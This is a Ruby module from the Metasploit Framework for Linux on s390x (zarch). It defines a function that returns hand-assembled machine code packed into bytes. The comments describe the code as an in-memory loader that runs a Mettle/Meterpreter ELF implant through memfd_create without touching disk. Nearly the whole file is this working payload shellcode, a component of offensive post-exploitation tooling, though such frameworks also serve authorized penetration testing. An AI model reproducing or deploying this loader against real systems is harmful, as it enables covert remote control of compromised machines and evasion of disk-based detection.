#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Martin Sutovsky <martin_sutovsky[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#
module Msf::Payload::Linux::Zarch::MeterpreterLoader
  def in_memory_loader(payload)
       in_memory_loader = [
      0x0d80a738, 0x00019200, 0xf0004120, 0xf000a719, 0x015e0a00, 0x18621744, 0x1848a758, 0x00ae1a45, 0x58404000, 0x17331838, 0xa75800b2, 0x1a350a04, 0x17339200, 0xf000a758, 0x00011bf5, 0x1876a758, 0x000a1766, 0x1d651846, 0xc2490000, 0x00304240, 0xf000a758, 0x00011bf5, 0xa7580000, 0x19754720, 0x803aa758, 0x000e1bf5, 0x922ff001, 0x9270f002, 0x9272f003, 0x926ff004, 0x9263f005, 0x922ff006, 0x9273f007, 0x9265f008, 0x926cf009, 0x9266f00a, 0x922ff00b, 0x9266f00c, 0x9264f00d, 0x922ff00e, 0x4120f001, 0xa7380000, 0xa7480000, 0x0a0b0707, payload.length
    ].pack('N*')
      in_memory_loader
  end
end
